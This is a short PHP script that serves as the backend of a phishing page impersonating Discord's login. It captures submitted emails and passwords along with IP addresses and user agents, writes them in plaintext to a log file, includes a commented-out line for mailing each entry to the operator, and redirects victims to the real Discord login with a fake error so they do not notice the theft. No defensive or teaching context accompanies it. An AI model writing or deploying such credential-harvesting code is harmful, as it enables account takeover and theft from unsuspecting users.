<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'];
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $timestamp = date('Y-m-d H:i:s');
    
    $logEntry = "[$timestamp] IP: $ip | UA: $userAgent | Email: $email | Password: $password\n";
    
    // Save to log file
    file_put_contents('discord_logs.txt', $logEntry, FILE_APPEND);
    
    // Optional: email yourself
    // mail('your@email.com', 'New Discord Login', $logEntry);
    
    // Redirect to real Discord with an error message
    header('Location: https://discord.com/login?error=invalid_credentials');
    exit();
}
?>
